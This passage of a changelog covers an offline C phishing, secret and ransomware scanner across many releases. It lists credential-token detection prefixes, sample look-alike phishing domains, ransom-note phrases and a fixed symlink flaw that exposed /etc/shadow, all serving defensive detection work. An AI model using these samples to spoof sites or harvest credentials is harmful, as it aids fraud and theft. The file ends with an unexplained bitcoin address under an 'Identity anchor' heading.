  - Hugging Face (`hf_` + 34 letters — letters-only body to avoid colliding
    with `hf_`-prefixed code identifiers)
  - PyPI Upload Token (`pypi-AgEIcHlwaS5vcmc…` — 20-char fixed marker, ~zero FP)
  - Postman (`PMAK-`), Square (`sq0atp-`), Doppler (`dp.pt.`),
    Grafana (`glsa_`), Linear (`lin_api_`), New Relic (`NRAK-`),
    Databricks (`dapi`)
  Still confined to `hlse_secrets.c`; **F1=1.000 re-verified** in- and
  out-of-distribution. Scanning HLSE's own source tree confirmed the new
  prefixes contribute zero false positives. Added a table-driven detection
  test and extended the prose false-positive guard (secrets suite 32 → 33).

## [0.9.32] — 2026-06-08

### Added
- **11 new credential patterns in the secret scanner** (14 → 25), closing the
  coverage gap against peer scanners (gitleaks/TruffleHog/detect-secrets) found
  in a competitive review. All additions are high-confidence, distinctive-prefix
  tokens with negligible false-positive risk:
  - Google API Key (`AIza` + 35)
  - GitLab Personal Access Token (`glpat-` + 20)
  - npm Access Token (`npm_` + 36)
  - OpenAI Project Key (`sk-proj-`) and Anthropic API Key (`sk-ant-`)
  - Shopify Access Token / Shared Secret / Private App (`shpat_`/`shpss_`/`shppa_` + 32 hex)
  - Stripe Restricted Key (`rk_live_`)
  - AWS Temporary/STS Access Key (`ASIA` + 16)
  - GitHub Refresh Token (`ghr_` + 36)
  These live entirely in `hlse_secrets.c` and are orthogonal to the URL/text
  detection corpus, so **F1=1.000 is unaffected** (verified in- and
  out-of-distribution). The placeholder/example exclusion still applies to all
  new patterns.
- **7 new secrets behavioral tests** (suite 25 → 32), including a prose
  false-positive guard asserting that prefix-sharing words (`npm_config`,
  `Asian`, `glpat`, `shppa`) in ordinary text produce zero findings.

## [0.9.31] — 2026-06-08

### Fixed
- **`examples/pre-commit-hook.sh` used wrong subcommand for secret detection**:
  the "Secret scan" section called `hlse_core text "$line"` (the scam-text
  pattern scanner) rather than `hlse_core secret` (the credential-pattern
  scanner `hlse_scan_secrets`). The `text` subcommand looks for urgency,
  financial bait, and authority signals — it does not match API keys, tokens,
  or `.env`-style secrets. A staged file containing `AWS_SECRET_ACCESS_KEY=…`
  or a GitHub PAT would pass the hook silently. Replaced the per-line `text`
  loop with a single `secret --stdin < "$file"` call using `--quiet` for
  the exit-code check, then re-running without `--quiet` to surface the
  finding detail. The fix also removes 5 lines of unnecessary shell loop.

## [0.9.30] — 2026-06-08

### Fixed
- **README "Test architecture" table had stale CLI integration count: 87 → 90**
  (docs). The table was last updated in GAP-J (0.9.12, 45→86) but three more
  tests were added since: two for GAP-Q (secret/email no-arg exit=2 regression,
  0.9.19) and one for GAP-R (SARIF relative-URI regression, 0.9.20). Updated
  count to 90 and added "SARIF relative URIs, no-arg exit=2" to the row's
  description. Docs-only — no code or detection change.

## [0.9.29] — 2026-06-08

### Fixed
- **`hlse_audit.c:240` for-loop accessed array index before bounds check**
  (code quality). The hosts-file scan lowercased an input string with
  `for (k = 0; p[k] && k < sizeof(lower) - 1; k++)`, testing `p[k]` before the
  bounds check on the output buffer. Although functionally correct (reading `p`
  never overflows; the bound check is on the output `lower`), cppcheck
  `--enable=portability` flagged it as `arrayIndexThenCheck`. Reordered to
  `k < sizeof(lower) - 1 && p[k]` to match the conventional bounds-first
  pattern. Zero behaviour change; cppcheck warning eliminated.

## [0.9.28] — 2026-06-08

### Fixed
- **Property test file header listed only P1–P7; implementation tests P1–P13**
  (docs; GAP-Z). When P8–P13 (HTML entity, zero-width Unicode, l33tspeak,
  Cyrillic/Greek homoglyph, combined, and full-width evasion) were added to
  `tests/hlse_property_tests.c`, the file's own header comment was not updated.
  A reader of the test file saw only 7 properties listed even though the suite
  enforces 13. Updated the file header to enumerate all 13 (now consistent with
  spec §4.1 added in 0.9.27). Docs-only — no code or detection change.

## [0.9.27] — 2026-06-08

### Fixed
- **Spec §4 did not enumerate the 13 text-detection property invariants**
  (docs; GAP-Y). Spec §7 stated `make test` runs "all suites + property + corpus +
  CLI integration" but never named what the property suite verifies. Added §4.1
  "Text-detection property invariants (P1–P13)" — a table listing all 13 formal
  guarantees (score monotonicity, bounds, determinism, case insensitivity,
  whitespace/HTML entity/zero-width/l33tspeak/Cyrillic/full-width evasion
  resistance, combined evasion, multilingual parity, and safe-corpus FP ≤ 5%).
  A spec reader can now verify what "property tests pass" means without reading
  the test source. Docs-only — no code or detection change.

## [0.9.26] — 2026-06-08

### Fixed
- **CONTRIBUTING.md carried stale test counts and an incomplete test-axis
  table** (docs; GAP-X). Three errors corrected:
  - "200+ tests" → "320+" (matches current measured total)
  - "All 7 suites" → "All 8 suites" (util_tests added in 0.9.12)
  - "100K random inputs" → "4 harnesses × 100K iterations" (matches GAP-I)
  The "Six-axis" section was retitled "Seven-axis" and the table extended
  from 4 rows to 7 to include Behavioral tests, CLI integration, and Fuzz
  harnesses — all of which previously had no guidance on when to add a test.
  Docs-only — no code or detection change.

## [0.9.25] — 2026-06-08

### Fixed
- **Spec §3.1 subcommand table listed wrong library function for `text`**
  (docs; SPECIFICATION.md §3.1, GAP-W). The table said `hlse_check_text`
  but the `text` subcommand was updated to call `hlse_scan()` in 0.9.15
  (GAP-N) to add embedded URL extraction. The table and purpose description
  are now aligned with the implementation. Docs-only — no code change.

## [0.9.24] — 2026-06-08

### Fixed
- **Spec §5.2 omitted the `scan_summary` terminator record** (docs + test;
  SPECIFICATION.md §5.2, GAP-V). `scan --json` emits a final
  `{"kind":"scan_summary","target":"...","files_scanned":N,"threats":N}`
  line after all per-finding records. Spec §5.2 mentioned streaming
  `scan` records but said nothing about the terminator. Documented it;
  also tightened the existing `--json scan with summary line` regression
  test to assert the `target` field.

## [0.9.23] — 2026-06-08

### Fixed
- **Spec §5.2 omitted the `target` field for `url`, `text`, and `protect`
  JSON output** (docs; SPECIFICATION.md §5.2, GAP-U). A strict per-kind
  audit (no implicit fields) revealed that `url`, `text`, and `protect` all
  emit a `target` string (scanned URL / text string / directory path) that
  was never mentioned in §5.2. The field is useful to consumers — it
  disambiguates which record belongs to which scan — so it is documented
  rather than removed. §5.2 is split to list `url`, `text`, and `protect`
  separately with their `target` fields; `network`, `esp`, and `email` (no
  `target`) remain grouped. Docs-only — no code or detection change.

## [0.9.22] — 2026-06-08

### Fixed
- **Spec §5.2 omitted the `paste` JSON `signals` field** (docs;
  SPECIFICATION.md §5.2, GAP-T). The `paste` kind emits an integer `signals`
  field (count of fired pastejacking signals) alongside `reasons`, but the
  §5.2 field inventory documented only `reasons`. Documented `signals` for
  consistency with `audit` (whose extra `hardening_index` integer is already
  documented). Audited all twelve `--json` kinds against §5.2; the other
  eleven match their inventories exactly. Docs-only — no code or detection
  change.

## [0.9.21] — 2026-06-08

### Added
- **CI workflows** (`.github/workflows/ci.yml`, `.github/workflows/codeql.yml`).
  The README claimed "CI enforces this with a privacy tripwire job" but no
  workflow files existed. Created:
  - `ci.yml`: three jobs — `build-and-test` (make all + test + check-warnings +
    asan-test), `cppcheck` (error gate with `--error-exitcode=1` + advisory-only
    informational run), and `privacy-tripwire` (strace captures URL/text/secret/
    package subcommands and asserts zero `socket()/connect()/bind()` syscalls).
  - `codeql.yml`: GitHub CodeQL C/C++ analysis with `security-and-quality`
    queries on push/PR to main plus weekly schedule.
  Both workflows target `main` and `claude/**` branches.

## [0.9.20] — 2026-06-08

### Fixed
- **SARIF `artifactLocation.uri` emitted absolute paths** (`hlse_core.c`
  `sarif_emit()`; SPECIFICATION.md §5.3). The `scan` subcommand's SARIF output
  used the full absolute `fullpath` as the URI value (e.g.
  `/repo/src/file.py`). GitHub code scanning and the SARIF standard require
  relative URIs (relative to the checkout root) so the tool can map findings
  back to source files. Fixed by stripping the scan root prefix from each path
  before passing it to `sarif_add()`, yielding URIs like `src/file.py`.
  Added regression test `SARIF: artifactLocation URIs are relative`
  (CLI integration suite now has 90 tests).

## [0.9.19] — 2026-06-08

### Fixed
- **`secret` and `email` subcommands returned exit=0 when invoked with no
  argument in non-interactive (CI/script) environments** (`hlse_core.c`;
  SPECIFICATION.md §3). Both subcommands used `!isatty(0)` to fall through to
  stdin reading when no argument was provided. In CI pipelines, stdin is not a
  tty even without a pipe, so they silently scanned empty input and exited
  clean. Fixed by requiring either an explicit text argument or the explicit
  `--stdin` flag; no argument at all now returns exit=2 with a usage error,
  consistent with `text`, `scan`, `protect`, `file`, and `package`.
- Added regression tests: `secret: no-arg exits 2` and `email: no-arg exits 2`
  (CLI integration suite now has 89 tests).

## [0.9.18] — 2026-06-08

### Fixed
- **`scan --json` `secret` records used `reasons` schema instead of
  `findings`** (`hlse_core.c` scan walker; SPECIFICATION.md §5.2, GAP-P).
  The spec §5.2 defines `kind=secret` as carrying
  `findings:[{type,description}]`. The standalone `secret` subcommand
  already emitted the correct structured schema; however the `scan` walker's
  JSON branch emitted a flat `reasons:["description string", ...]` array
  instead. Fixed the scan walker to emit
  `findings:[{"type":"...","description":"..."}]` objects, making all
  `kind=secret` records consistent across both code paths.

## [0.9.17] — 2026-06-08

### Fixed
- **SARIF rule definitions missing `security-severity`** (`hlse_core.c`
  `sarif_emit()`; SPECIFICATION.md §5.3, GAP-O). The SARIF output had
  `security-severity` on individual result objects but not on rule
  definitions, which GitHub code scanning requires to classify vulnerability
  severity. Added `"properties": { "security-severity": "X.X" }` to each
  rule (`secret`=9.0, `file-masquerade`=8.0, `phishing-url`=7.5). Also
  improved rule `shortDescription` text from the generic "HLSE X detector"
  to human-readable descriptions.

- **`scan --json` `url` records missing `reasons` field** (`hlse_core.c`
  scan walker; SPECIFICATION.md §5.2, GAP-O companion). When the `scan`
  directory walker found a phishing URL embedded in a source file, the
  human-readable output included the reason strings but the `--json` URL
  record did not emit `"reasons"`. Fixed to match the spec §5.2 requirement
  that `url` JSON objects carry `reasons:[...]`.

## [0.9.16] — 2026-06-08

### Fixed
- **`--stdin --json` dropped embedded URL scores** (`hlse_core.c`
  `stdin_mode()`; companion to GAP-N). The `--stdin --json` path had the
  identical bug as the `text`/auto-detect JSON paths fixed in 0.9.15:
  `hlse_check_text(line)` was called instead of reusing the `ScanResult`
  already computed by `hlse_scan(line)`, so text lines with embedded
  phishing URLs returned score=0 in JSON mode while human output showed
  the correct BLOCK.

### Changed
- **README docs**: property table corrected `P1–P12` → `P1–P13` (P13
  full-width Unicode evasion was already implemented and passing); CLI
  integration count updated 86 → 87.

## [0.9.15] — 2026-06-08

### Fixed
- **`--json text` dropped embedded URL scores** (`hlse_core.c`;
  SPECIFICATION.md §8, GAP-N). When a text message contained an embedded
  phishing URL (e.g. `"click https://paypa1.com/signin"`), the human-readable
  path called `hlse_scan()` (embedded URL extraction → score 60) but the
  `--json` path re-called `hlse_check_text()` alone, returning score 0 for
  the same input. Same flaw in the auto-detect JSON path. Both paths now
  reuse the `ScanResult` already computed by `hlse_scan()` to build the
  `TextVerdict` for JSON output. Regression guard added to CLI integration
  (now 87 tests). Man page `.TH` header version/date also updated.

- **Man page version frozen at 0.9.0** (`hlse.1`; SPECIFICATION.md §8,
  GAP-M). `.TH` header still read `"HLSE 0.9.0"` / `"2026-05-31"`, and the
  OPTIONS section omitted `-h | --help`. Updated header to `0.9.15` /
  `2026-06-08` and added the missing option entry.

## [0.9.14] — 2026-06-08

### Fixed
- **`-h | --help` absent from help output** (`hlse_core.c` `print_usage()`;
  SPECIFICATION.md §8, GAP-L). Spec §3.2 lists `-h`, `--help` as a global
  flag; all other 7 flags appeared in the "Options" block but `--help` did
  not self-reference. Added `%s -h | --help  Show this help` as the final
  option line (1 `printf` arg added; arg count in comment updated to 8).

## [0.9.13] — 2026-06-08

### Fixed
- **README C library API accuracy** (SPECIFICATION.md §8, GAP-K). The README
  claimed "29 functions exported in `libhlse.so`" but `nm -D libhlse.so`
  reports 35 (six additions since the original count: `hlse_esp_verify`,
  `hlse_audit_hardening_index`, `hlse_validate_crypto_address`,
  `hlse_is_high_entropy_benign_magic`, `hlse_shannon_entropy_str`,
  `hlse_text_action_for_score`). The code example also omitted `hlse_util.h`
  and six entry points (`scan_secrets`, `check_email_headers`,
  `check_crypto_swap`, `esp_verify`, `audit_hardening_index`, `validate_crypto`).
  The "All pure functions, thread-safe" note was inaccurate — filesystem/host
  functions (protect/audit/network) are process-level. Updated count to 35,
  added missing examples, corrected thread-safety note. Also updated spec §7
  fuzz description from `100K` to `4 × 100K`. Docs-only.

## [0.9.12] — 2026-06-08

### Fixed
- **README test-architecture accuracy** (SPECIFICATION.md §8, GAP-J). The
  per-suite counts in the "Test architecture" table had drifted from reality
  (Unit-URL 13→23, Unit-text 14→15, Property 60→64, Secrets 20→25,
  File/Audit 14→17, CLI integration 45→86), and the `util_tests` (14) and
  out-of-distribution corpus (25) suites were missing entirely. The Fuzz row
  predated GAP-I (one text harness → four). Refreshed all rows to measured
  counts, added the two missing suites, and updated the Fuzz row to `4 × 100K`.
  The at-a-glance `320+` floor was re-verified and still holds (≈339
  suite/corpus + in-distribution benchmark checks). Docs-only.

## [0.9.11] — 2026-06-08

### Added
- **Multi-module fuzz harnesses** (`tests/hlse_secrets_fuzz.c`,
  `tests/hlse_supply_fuzz.c`, `tests/hlse_file_fuzz.c`;
  SPECIFICATION.md §8, GAP-I). Previously `make fuzz` / `make fuzz-asan`
  covered only `hlse_text.c`; the five other parser modules had zero fuzz
  coverage. Three portable smoke-fuzz harnesses added — same pattern as the
  original: deterministic PRNG, signal-handler crash detection, score-range
  assertion, 100K iterations (10K under ASan):
  - `hlse_secrets_fuzz.c` — `hlse_scan_secrets`, `hlse_check_email_headers`,
    `hlse_check_crypto_swap`, `hlse_validate_crypto_address` (4 entry points;
    generators: random bytes, credential fragments, email headers, crypto addresses)
  - `hlse_supply_fuzz.c` — `hlse_check_package`, `hlse_check_paste`
    (generators: random bytes, typosquat-mutated names, pastejacking commands)
  - `hlse_file_fuzz.c` — `hlse_check_filename` (disk-free path; generators:
    random bytes, double-extension, bidi/control characters, social-engineering lures)
- `make fuzz` now runs all four harnesses sequentially; `make fuzz-asan` runs
  all four under ASan/UBSan. `make clean` removes all harness binaries.

## [0.9.10] — 2026-06-06

### Fixed
- **README accuracy** (SPECIFICATION.md §8, GAP-H). "Structured tests: 237" and
  "Binary size: 53 KB (dynamic), 932 KB (static)" had drifted — actual is ≈328
  checks across the suites + CLI integration, and ≈140 KB dynamic / ≈1.0 MB
  static-pie (stripped) after the feature and hardening work. Updated to a
  non-drifting `320+` and measured approximate sizes; dropped the brittle exact
  count from the `make test` comment. The detection/evasion examples, F1=1.000,
  and 0% FP claims were re-verified and are accurate.

## [0.9.9] — 2026-06-06

### Changed
- **Consistent JSON `action` band** (`hlse_core.c`; SPECIFICATION.md §5.2,
  GAP-G). Only 4 of 12 `--json` kinds (`url`, `text`, `protect`, `esp`) emitted
  the `action` band; the other 8 (`package`, `paste`, `network`, `secret`,
  `email`, `clipboard`, `audit`, `file`) plus the streaming `scan` records
  omitted it, forcing consumers to re-derive the band from `score`. Every
  score-bearing JSON object now carries `"action"` (from
  `hlse_action_for_score`). 10 CLI action-consistency tests added.

## [0.9.8] — 2026-06-06

### Fixed
- **Solana clipboard-swap detection** (`hlse_secrets.c`; SPECIFICATION.md §8,
  GAP-F). The header advertised crypto-swap support for "BTC, ETH, XMR, SOL,
  USDT" and the `CRYPTO_SOL` enum / `"SOL (Solana)"` name existed, but
  `detect_crypto_type()` had no Solana branch, so a Solana clipper swap was
  silently never flagged. Add a base58 32–44 Solana branch, evaluated last so
  the prefixed/fixed-length formats (BTC `1`/`3`, USDT `T`, ETH `0x`, …) keep
  precedence. Detection is confined to the clipboard-swap comparison and the
  (test-only) validator — it does not feed the URL/text path, so phishing/scam
  F1 is unaffected. Adds validate + swap regression tests.

## [0.9.7] — 2026-06-06

### Security
- **`scan` no longer follows symlinks** (`hlse_core.c`; SPECIFICATION.md §1,
  GAP-E). A second spec audit found the recursive directory walker classified
  entries with `stat()` (follows links) and read files with `fopen()` (no
  `O_NOFOLLOW`). A symlinked directory could make the scan escape the target
  tree (and risk symlink cycles); a symlinked file such as `x.env ->
  /etc/shadow` was opened and scanned for secrets, disclosing a file outside
  the scanned tree. Now classified with `lstat()` (symlinks become `S_ISLNK`
  and are skipped) and re-opened with `O_NOFOLLOW | O_NONBLOCK` + `S_ISREG`
  (TOCTOU defence), matching the hardened pattern already used in
  `hlse_file.c`, `hlse_audit.c`, and the ESP scan. Real in-tree files are still
  scanned; a regression test plus an ASan symlink-cycle test were added.

## [0.9.6] — 2026-06-06

### Added
- **Formal specification** (`docs/SPECIFICATION.md`): the CLI contract, scoring
  model, per-module behaviour, output schemas, design invariants, and a gap
  analysis. Writing it surfaced that several documented/library capabilities had
  no CLI access — resolved below.
- **`secret` subcommand**: scan a text argument or stdin for leaked credentials
  (`hlse_scan_secrets`), previously reachable only via a directory `scan`.
- **`email` subcommand**: email-header forensics (`hlse_check_email_headers`) —
  SPF/DKIM, Reply-To mismatch, display-name/BEC spoofing. Arg or `--stdin`.
- **`clipboard` subcommand**: crypto address-swap / clipper detection
  (`hlse_check_crypto_swap`, including the 0.9.3 vanity look-alike escalation),
  previously library-only.
- All three honour `--json`; `esp` (added in 0.9.4) plus the three new commands
  are now documented in `--help`/`print_usage`, the man page, and the README.

### Notes
- These are thin CLI wrappers over existing, tested library functions — no
  detection logic changed. 14 new CLI integration tests; ASan/UBSan clean
  (empty/large/binary stdin); strict warnings + cppcheck clean.

## [0.9.5] — 2026-06-05

### Added
- **Lynis-style hardening index** (`hlse_audit.c`): new
  `hlse_audit_hardening_index()` returns a 0..100 score where 100 = fully
  hardened (the complementary view of the finding-weighted risk score). The
  `audit` subcommand now prints `Hardening index: N/100 (hardened|good|fair|
  weak)` and exposes `hardening_index` / `hardening_band` in `--json audit`,
  giving the same at-a-glance posture signal Lynis provides. Stateless helper;
  no detection logic changed. (Research backlog #7.)

## [0.9.4] — 2026-06-05

### Added
- **EFI System Partition (ESP) integrity check** (`hlse_protect.c`, new `esp`
  subcommand): `hlse_esp_verify` walks the ESP (default `/boot/efi`) and flags
  `.efi` binaries containing high-specificity ransom/bootkit text. The legacy
  MBR check only covers BIOS boot; the live boot-level threat is UEFI bootkits
  (BlackLotus, Linux Bootkitty) that tamper with the ESP. Unlike the MBR scan,
  this uses only multi-word ransom-note phrases (`"all your files have been
  encrypted"`, `"pay bitcoin"`, …) — the MBR's generic single-word tokens
  (`decrypt`, `locked`) would false-positive inside legitimate multi-MB signed
  bootloaders. Read-only, never follows symlinks, depth- and count-bounded.
  `--json esp` supported. 6 CLI regression cases added.

### Notes
- ESP signature (Authenticode) validation is intentionally deferred: it cannot
  be done safely offline without a baseline, and a wrong implementation would
  risk false negatives. See `docs/RESEARCH_IMPROVEMENTS.md` #8.

## [0.9.3] — 2026-06-05

### Added
- **Clipboard clipper "vanity look-alike" signal** (`hlse_secrets.c`): when a
  same-type crypto address is swapped, `hlse_check_crypto_swap` now measures the
  shared leading/trailing characters between the original and the replacement.
  Real clipboard hijackers (per EthClipper, arXiv 2108.14004) grind a
  replacement that shares the victim address's ends so a glance misses the
  swap; a shared tail of 4+ chars between two *different* addresses is
  essentially impossible by chance. Such swaps now escalate from BLOCK (95) to
  ISOLATE (100) with an explanatory reason. Purely additive — detection is never
  weakened; addresses with no shared ends keep their existing score.

## [0.9.2] — 2026-06-05

### Added
- **IDN homograph detection via Punycode** (`hlse_core.c`): `xn--` labels are
  now decoded per RFC 3492 and analysed UTS-39 style. Cyrillic/Greek/Armenian
  homographs delivered as Punycode (which is pure ASCII and so invisible to the
  existing UTF-8 mixed-script check) are caught: a confusable-folded label that
  resembles a brand, or a label mixing Latin with another script, is flagged.
  `xn--pple-43d` (аpple), `xn--ggle-55da` (gооgle), `xn--pypl-53dc` (pаypаl) and
  `xn--mirosoft-gch` (miсrosoft) now score BLOCK. Legitimate single-script IDNs
  — `xn--mnchen-3ya` (münchen), `xn--wgv71a` (日本), `xn--e1afmkfd` (пример) —
  are deliberately **not** flagged, preserving the 0.0% false-positive posture.
  Closes the largest detection gap identified in `docs/RESEARCH_IMPROVEMENTS.md`
  (item #1). Pure C, no network, no new dependencies.

### Changed
- 7 IDN regression cases added to the in-binary `--self-test`; in- and
  out-of-distribution corpora remain F1 = 1.000; ASan/UBSan clean (including
  malformed Punycode); strict warnings and cppcheck clean.

## [0.9.1] — 2026-06-04

Security-hardening release. No detection-logic changes: in- and
out-of-distribution corpora remain F1 = 1.000 and all 237+ tests pass.

### Security
- **Exploit-mitigation build flags** (`Makefile`): the binaries are now
  compiled with `-fstack-protector-strong` and `-D_FORTIFY_SOURCE=2`, and
  linked as PIE with Full RELRO, `BIND_NOW`, and a non-executable stack on
  Linux (`-static-pie` for the static target). Previously the security
  tool itself shipped with no hardening (`-O2 -Wall -Wextra`, empty
  `LDFLAGS`). macOS builds are unaffected (uname-guarded linker flags).
- **Symlink / special-file safety** (`hlse_file.c`, `hlse_audit.c`): file
  reads now use `O_NOFOLLOW | O_NONBLOCK` and require `S_ISREG` via
  `fstat()`. A symlink can no longer redirect a scan to an arbitrary file
  (e.g. `/etc/shadow`) and a FIFO/device node can no longer block the
  scanner. Brings both modules in line with `hlse_protect.c`.

### Changed
- **Bounded string construction** (`hlse_core.c`): replaced an unbounded
  `strcpy`/`strcat` pair in the homoglyph `ii→ll` path and the default
  path assignment with clamped `memcpy`/explicit writes. Behaviour is
  unchanged; removes latent overflow hazards.
- **DRY** (`hlse_util.c`): the benign high-entropy magic-byte table
  (ZIP/GZIP/JPEG/PNG/…) used by the ransomware entropy heuristic moved
  into a shared `hlse_is_high_entropy_benign_magic()`.
- **`hlse_scan` reason copy** (`hlse_core.c`): bound the copy loop by the
  source `Verdict.reasons` size instead of a mismatched literal.

### Added
- **Static analysis config** (`.clang-tidy`): a bugprone/cert/
  clang-analyzer check set for local runs
  (`clang-tidy hlse_*.c -- -I. -std=c99 ...`). Companion CI jobs — a
  cppcheck `error`-severity gate (with documented inline suppressions)
  and a CodeQL `security-and-quality` workflow for C — plus a
  `release.yml` version-gate fix are maintained alongside the
  repository's GitHub Actions workflows.
- **cppcheck-driven fixes** (`hlse_core.c`): bound the `hlse_scan`
  reason copy by the source `Verdict.reasons` size, and document a
  `legacyUninitvar` false positive with an inline suppression.

## [0.9.0] — 2026-05-31

### Added
- **DGA / high-entropy domain detection** (`hlse_core.c`): Shannon entropy
  + digit-ratio analysis flags algorithmically generated domains
  (`x7k2p9qzr4mw.com`). Grounded in published phishing-URL feature research;
  requires both high entropy and digit presence to avoid false positives on
  long brand names (stackoverflow, amazonwebservices).
- **Brand-hyphen phishing** — `paypal-verify.com`, `apple-support.net`
  flagged via brand + hyphen + security-word pattern.
- **Digraph homoglyph** — `arnazon.com` (rn→m), `vv→w` normalization.
- **New abused TLDs** — `.zip`, `.mov`, `.country`, and others added to the
  high-risk list.
- **BEC amplifiers** (`hlse_text.c`): authority+wire, secrecy+wire, and
  authority+secrecy+payment compound rules; expanded executive-title and
  secrecy phrasings. CEO-fraud messages now reach ISOLATE.
- **Full-width Unicode folding** — `ｕｒｇｅｎｔ` (U+FF01-FF5E) collapsed to
  ASCII before keyword matching.
- **Polyglot file detection** (`hlse_file.c`): image/archive magic bytes
  (GIF/JPEG/PNG/ZIP/GZIP) with an executable extension flagged as payload
  disguise.
- **Bidi-override filename detection** — U+202E (RLO), U+202D (LRO), and
  bidi isolates flagged independent of apparent extension; `file`
  subcommand now analyzes names even when the file is absent.
- **SARIF 2.1.0 output** — `--sarif scan <dir>` emits GitHub code-scanning
  compatible results with rule definitions and security-severity.
- **Shared utility module** (`hlse_util.c`): Shannon entropy and
  Damerau-Levenshtein consolidated from three duplicate copies (DRY).

### Changed
- **Secret scanner** now excludes placeholder/example/test keys
  (`AKIAIOSFODNN7EXAMPLE`, `your_api_key_here`, repetitive tokens),
  matching the false-positive reduction of gitleaks/TruffleHog without
  requiring network verification.
- **Ransomware entropy** check excludes known compressed/media formats by
  magic byte, eliminating false positives on directories of `.zip`/`.gz`/
  `.jpg` files (Shannon entropy cannot distinguish encrypted from
  compressed; magic-byte exclusion is the robust fix).
- `scan` now errors (exit 2) on a missing directory instead of reporting
  a clean result.

### Fixed
- Unterminated HTML entities (`U&#82GENT` without semicolon) now decoded
  like browsers do.
- CI workflow rebuilt to run the full test suite, strict warnings,
  sanitizers, fuzzing, coverage gate, and gitleaks (previously only ran a
  subset and referenced a nonexistent test file).

### Security
- Added `release.yml` that re-runs all gates before producing signed
  release artifacts; a release can no longer bypass CI.

## [0.8.0] — 2026-05-12

### Added
- **Protection module** (`hlse_protect.c`): 4 behavioral detection layers
  - Ransomware: Shannon entropy analysis, ransom note detection (14
    filenames), extension mutation (26 extensions), compound rules
  - Network drive: /proc/mounts CIFS/NFS detection, lateral movement amplifier
  - SMB server: canary honeypot files, Samba audit log analysis
  - MBR/GPT: boot signature check, first-instruction validation,
    bootkit string scan, boot code entropy analysis
- **Secrets module** (`hlse_secrets.c`): 3 detection layers
  - Credential scanner: AWS keys, GitHub PATs, Stripe keys, Slack tokens,
    SSH private keys, .env passwords, generic high-entropy secrets
  - Email header forensics: display-name vs From mismatch, Reply-To
    mismatch, SPF/DKIM/DMARC fail, free-email corporate impersonation
  - Clipboard crypto-swap: BTC/ETH/XMR/SOL/USDT address validation +
    swap detection
- Unified `hlse_scan` API — auto-detects URL vs text, runs both detectors
- `hlse_core.h` public header with ScanResult, Verdict types
- Apple-style zero-argument demo (`./hlse_core` with no args)
- `--version` / `-V` flag
- Empty input → meaningful error ("Nothing to scan")
- `protect` CLI subcommand with auto-detect (dir→ransomware, /dev/→MBR)
- JSON output for protect subcommand
- 14 protection tests + 20 secrets tests integrated into `make test`

### Changed
- `check_url` made static (internal only); `hlse_check_url` is the public API
- Library exports unified to `hlse_` prefix (19 symbols, no namespace pollution)
- `stdin_mode` rewritten to use `hlse_scan` (eliminated duplicate URL/text branching)
- Progressive disclosure: safe → 1 line, threat → detailed reasons

### Fixed
- Format-truncation warnings in hlse_secrets.c (display_name overflow)
- `memmem()` replaced with portable `memcmp` loop (macOS/musl compat)
- `system("rm -rf")` in tests replaced with `opendir/unlink/rmdir`
- Block comment terminated early by `/dev/*` glob in comment
- Stale build artifacts removed from outputs/

## [0.7.0] — 2026-04-29

First production release of the C reference implementation.

### Added
- 12 URL detectors (homoglyph, mixed-script, typosquat, suspicious TLD, etc.)
- 10 text signals + 4 amplifiers, multilingual EN/JP/ZH/KR
- JSON output, stdin pipe mode, text mode
- 45 property tests across 7 axes
- 18 + 18 corpus benchmark, F1=1.000
- libhlse.so shared library (~22 KB) for FFI
- Static binary build (~742 KB stripped)
- GitHub Actions CI: Linux+macOS × GCC+Clang
- Privacy tripwire CI job blocking network calls

### Bug fixes (TDD-driven discovery)

These bugs slipped through unit tests but were caught by property tests
or the corpus benchmark:

- **CONFUSABLES collision**: `paypa1.com` not detected because `('1','i')`
  came after `('1','l')`. Fixed: keep only `('1','l')`, expand digits.
- **Capital-I homoglyph**: `paypaII.com` undetected, str_tolower stripped
  the signal. Fixed: II→ll alternative form check.
- **Cyrillic homoglyph**: `mіcrosoft.com` undetected. Fixed: UTF-8 byte
  mapping for Cyrillic→ASCII collapse.
- **Wikipedia false positive**: `/wiki/Verify` flagged. Fixed: trusted-host
  allowlist requires ≥3 phishing-path matches.
- **Double counting**: `paypa1.com` scored 95 (homoglyph 45 + typosquat 50).
  Fixed: typosquat skips when homoglyph already fired.
- **str_to_lower mangled UTF-8**: applied tolower to high bytes. Fixed:
  ASCII bytes only (`< 0x80`).
- **normalize_whitespace mangled multibyte**: continuation bytes treated
  as whitespace. Fixed: detect UTF-8 sequence length, copy intact.
- **JP/ZH/KR keywords missed**: signal tables were EN-only. Fixed: full
  multilingual keyword tables + MATCH macro dispatching on first byte.
- **strtok_r segfault under -std=c11**: missing POSIX feature macro.
  Fixed: `-D_POSIX_C_SOURCE=200809L`.
- **Under-firing**: ransom/tech-support scored below ALERT threshold.
  Fixed: raised base_weight and per_hit_bonus on critical signals.

### Performance (in-process via libhlse.so)
- check_text short: 2.08 µs
- check_text long: 2.83 µs

### Privacy
- Zero network calls (CI-enforced)
- Zero environment reads
- Zero file I/O outside stdin/stdout

### Acceptance criteria (all PASS)
- recall ≥ 0.85 → 1.000
- FP rate ≤ 0.05 → 0.000
- F1 ≥ 0.85 → 1.000
- 72 tests green (27 unit + 45 property)

## Identity anchor

```
bitcoin:bc1qjaet6jgpk08la46jelmlpgsz84luc4lc0tnwr5
```
